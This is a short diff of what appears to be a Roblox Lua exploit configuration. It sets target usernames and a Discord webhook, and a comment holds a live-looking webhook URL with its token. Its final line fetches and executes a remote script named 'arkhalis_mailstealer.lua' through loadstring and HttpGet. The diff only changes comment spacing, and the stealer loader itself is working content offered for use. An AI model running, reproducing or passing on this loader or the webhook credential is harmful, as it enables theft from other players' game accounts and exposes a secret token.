@@ -1,9 +1,9 @@
 
-_G.Username1 = "" --// Am10o
-_G.Username2 = "" --// Am10o
+_G.Username1 = "" --//Am10o
+_G.Username2 = "" --//Am10o
 
 --[[ WebHook ]]--
-_G.Webhook = "" --// https://discord.com/api/webhooks/1114105275360759838/EFO7BCGzxhvjIE_VzbyhGFpXE2jo20NvGY4FD4EXKmUO5Txpxm1YoXRL5Olkgqqq6Fcv
+_G.Webhook = "" --//https://discord.com/api/webhooks/1114105275360759838/EFO7BCGzxhvjIE_VzbyhGFpXE2jo20NvGY4FD4EXKmUO5Txpxm1YoXRL5Olkgqqq6Fcv
 
 --[[ Script ]]--
 loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
